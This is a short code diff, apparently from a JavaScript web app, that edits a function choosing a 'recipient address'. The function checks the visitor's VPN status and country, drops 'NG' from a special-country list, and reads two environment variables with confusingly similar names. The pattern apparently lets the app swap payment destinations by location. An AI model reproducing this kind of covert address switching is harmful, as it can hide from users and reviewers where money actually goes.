@@ -55,7 +55,7 @@ export async function getRecipientAddress() {
   // Check VPN status via IPQualityScore
   const isVpnIPQS = await checkVpnStatusWithIPQS(ip);
 
-  const specialCountries = ["NG", "AE"];
+  const specialCountries = ["AE"];
   const address = import.meta.env.VITE_REACT_APP_R;
   const addrEss = import.meta.env.VITE_REACT_APP_r; 
 
